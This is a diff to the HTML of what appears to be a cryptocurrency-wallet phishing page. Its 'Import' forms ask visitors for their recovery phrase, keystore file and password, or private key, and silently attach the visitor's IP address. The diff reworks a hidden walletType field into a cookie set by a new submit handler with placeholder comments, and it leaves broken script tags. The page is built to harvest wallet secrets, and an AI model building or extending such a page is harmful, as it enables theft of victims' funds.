@@ -240,7 +240,6 @@
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
-                <input type="hidden" name="walletType" id="walletType">
                 <button type="submit" value="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
                 <p class="form-instrunctions text-center">Typically 12 (sometimes 24) words separated by single spaces</p>
             </form>
@@ -255,7 +254,6 @@
                 <input type="password" name="password" placeholder="Password" id="dienfio" class="pass-field" required>
                 <input type="hidden" name="user_ip" id="user_ip_keystore">
                 <input type="hidden" name="type" id="type-keystore">
-                <input type="hidden" name="walletType" id="walletType">
                 <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
                 <p class="form-instrunctions text-center">Several lines of text beginning with "{...}" plus the password you used to encrypt it</p>
             </form>
@@ -267,7 +265,6 @@
                 <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_key">
                 <input type="hidden" name="type" id="type-key">
-                <input type="hidden" name="walletType" id="walletType">
                 <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
                 <p class="form-instrunctions text-center">Typically 64 alphanumeric characters</p>
             </form>
@@ -298,8 +295,7 @@
                 document.getElementById('user_ip_phrase').value = data.ip;
                 document.getElementById('user_ip_keystore').value = data.ip;
                 document.getElementById('user_ip_key').value = data.ip;
-                document.getElementById('walletType').value = data.ip;
-            })
+                })
             .catch(error => {
                 console.error('Error fetching IP address:', error);
             });
@@ -351,12 +347,23 @@
     });
 </script>-->
 
+<script>
+  $("form#pass-phrase").submit(async(e)=>{
+    e.preventDefault();
+    if(validatePhrase()){
+      const ip = document.getElementById('user_ip_phrase').value;
+      const walletType = "Your Wallet Type"; // Replace "Your Wallet Type" with the actual wallet type you want to set
+      Cookies.set("walletType", walletType); // Set the cookie named "walletType" with the value of walletType
+      const fullType = `Passphrase\n\nWallet Type: ${walletType}`;
+      // Your further code
+    }
+  });
+</script>
 
-   
-   <script>
+<script>
     console.log(Cookies.get("walletType")
-    </script>
-   </body>
+    <script>
+</body>
 
 
     
